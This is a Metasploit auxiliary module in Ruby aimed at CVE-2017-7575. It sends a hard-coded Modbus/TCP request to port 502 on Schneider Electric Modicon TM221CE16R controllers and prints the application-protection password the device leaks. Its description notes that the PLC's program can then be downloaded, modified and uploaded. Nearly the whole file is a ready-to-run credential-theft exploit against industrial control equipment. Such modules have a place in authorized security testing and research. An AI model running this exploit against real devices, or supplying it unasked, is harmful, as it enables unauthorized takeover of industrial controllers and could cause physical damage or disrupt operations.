##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Schneider Electric Password Leak',
      'Description' => %q{
        Schneider Electric Modicon TM221CE16R 1.3.3.3 devices allow remote
        attackers to discover the application-protection password via a
        \x00\x01\x00\x00\x00\x05\x01\x5a\x00\x03\x00 request to the Modbus port
        (502/tcp). Subsequently the application may be arbitrarily downloaded,
        modified, and uploaded.
      },
      'Author'      =>
      [
        'Ezequiel Fernandez', # discovery
        'Juan Escobar <juan[at]]null-life.com>' # metasploit module
      ],
      'References'  =>
      [
        [ 'CVE', '2017-7575' ],
        [ 'URL', 'https://www.industrial.army/2020/06/exploit-obtencion-remota-de-credenciales-en.html' ],
      ],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(502),
      ])
  end

  def run
    connect()

    sock.put("\x00\x01\x00\x00\x00\x05\x01\x5a\x00\x03\x00")
    data = sock.get_once

    if data
      print_good("MODBUS - received correct MODBUS/TCP data: #{data[45, data.length-20].gsub("\x00",'')}")
    else
      print_status("MODBUS - did not receive data.")
    end

    disconnect()
  end
end
